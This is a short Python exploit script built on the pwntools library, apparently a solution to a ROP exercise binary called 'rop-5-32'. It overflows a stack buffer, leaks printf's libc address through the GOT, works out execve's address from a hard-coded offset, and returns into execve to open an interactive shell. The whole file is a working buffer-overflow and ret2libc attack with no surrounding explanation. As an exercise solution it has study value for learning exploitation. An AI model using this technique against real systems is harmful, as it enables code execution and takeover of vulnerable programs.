#!/usr/bin/env python

from pwn import *

p = process("./rop-5-32")

got_of_printf = p.elf.got['printf']
printf_at_plt = p.elf.plt['printf']
input_func = p.elf.symbols['input_func']
print("Got of printf %s" % hex(got_of_printf))
print("Printf@plt %s" % hex(printf_at_plt))
print("input_func() %s" % hex(input_func))

buf = "A" * 0x88 + "BBBB"

buf += p32(printf_at_plt)
buf += p32(input_func)      # get the second chance to exploit
buf += p32(got_of_printf)

p.recv()

p.sendline(buf)

data = p.recv()

print(repr(data))

cut_data = data[len(buf) + 9:]

print(repr(cut_data))

libc_addr_raw = cut_data[:4]

libc_addr = u32(libc_addr_raw)

print("Addr of printf %s" % hex(libc_addr))

"""
pwndbg> print execve
$1 = {<text variable, no debug info>} 0xf7e0d7e0 <execve>
pwndbg> print printf
$2 = {<text variable, no debug info>} 0xf7da6670 <__printf>
"""

offset = 0xf7e0d7e0 - 0xf7da6670

libc_execve = libc_addr + offset
#print (libc_execve)

'''
if os.path.exists("8"):
    os.unlink("8")

os.symlink("sh","8");
'''
buf = "A" * 0x88 + "BBBB"
buf += p32(libc_execve)
buf += p32(0)
# 0x8048220:"8"
buf += p32(0x8048220)
buf += p32(0)
buf += p32(0)

p.sendline(buf)

p.interactive()